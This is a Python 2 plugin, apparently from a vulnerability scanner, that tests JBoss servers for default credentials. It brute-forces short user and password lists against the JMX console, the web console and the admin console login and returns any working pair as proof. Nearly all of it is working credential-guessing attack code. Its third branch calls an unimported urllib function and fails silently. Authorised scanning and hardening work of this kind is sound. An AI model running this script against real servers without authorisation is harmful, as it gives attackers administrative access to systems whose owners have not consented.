# coding=utf-8
# author:wolf
import base64
import re
import urllib2
from config import is_port_open, is_http


@is_port_open
def verify(host, port=80, name="jboss", timeout=10):
    url = "http://%s:%d" % (host, int(port))
    info = {
        "url": "",
        "vuln_name": "jboss weak password",
        "proof": "",
        "severity": "high"
    }
    error_i = 0
    if is_http(host, int(port)) is False:
        return
    flag_list = ['>jboss.j2ee</a>','JBoss JMX Management Console','HtmlAdaptor?action=displayMBeans','<title>JBoss Management']
    user_list = ['admin', 'manager', 'jboss', 'root']
    PASSWORD_DIC = ['admin', 'jboss', '123456', 'manager']
    for user in user_list:
        for password in PASSWORD_DIC:
            try:
                login_url = url + '/jmx-console'
                request = urllib2.Request(login_url)
                auth_str_temp = user + ':' + password
                auth_str = base64.b64encode(auth_str_temp)
                request.add_header('Authorization', 'Basic ' + auth_str)
                res = urllib2.urlopen(request, timeout=timeout)
                res_code = res.code
                res_html = res.read()
            except urllib2.HTTPError,e:
                res_code = e.code
                res_html = e.read()
            except urllib2.URLError,e:
                error_i+=1
                if error_i >= 3:
                    return
                continue
            if int(res_code) == 404:
                break
            if int(res_code) == 401:
                continue
            for flag in flag_list:
                if flag in res_html:
                    # info = u'存在弱口令，用户名：%s，密码：%s'%(user,password)
                    info["url"] = login_url
                    info["proof"] = "username={}&password={}".format(user, password)
                    return info
    for user in user_list:
        for password in PASSWORD_DIC:
            try:
                login_url = url+'/console/App.html'
                request = urllib2.Request(login_url)
                auth_str_temp=user+':'+password
                auth_str=base64.b64encode(auth_str_temp)
                request.add_header('Authorization', 'Basic '+auth_str)
                res = urllib2.urlopen(request,timeout=timeout)
                res_code = res.code
                res_html = res.read()
            except urllib2.HTTPError,e:
                res_code = e.code
            except urllib2.URLError,e:
                error_i+=1
                if error_i >= 3:
                    return
                continue
            if int(res_code) == 404:
                break
            if int(res_code) == 401:
                continue
            for flag in flag_list:
                if flag in res_html:
                    # info = u'存在弱口令，用户名：%s，密码：%s' % (user, password)
                    info["url"] = login_url
                    info["proof"] = "username={}&password={}".format(user, password)
                    return info
    for user in user_list:
        for password in PASSWORD_DIC:
            try:
                login_url = url+'/admin-console/login.seam'
                res_html = urllib2.urlopen(login_url).read()
                if '"http://jboss.org/embjopr/"' in res_html:
                    key_str=re.search('javax.faces.ViewState\" value=\"(.*?)\"',res_html)
                    key_hash=urllib.quote(key_str.group(1))
                    PostStr="login_form=login_form&login_form:name=%s&login_form:password=%s&login_form:submit=Login&javax.faces.ViewState=%s"%(user,password,key_hash)
                    request = urllib2.Request(login_url,PostStr)
                    res = urllib2.urlopen(request,timeout=timeout)
                    if 'admin-console/secure/summary.seam' in res.read():
                        # info = u'存在弱口令，用户名：%s，密码：%s' % (user, password)
                        info["url"] = login_url
                        info["proof"] = "username={}&password={}".format(user, password)
                        return info
            except:
                pass
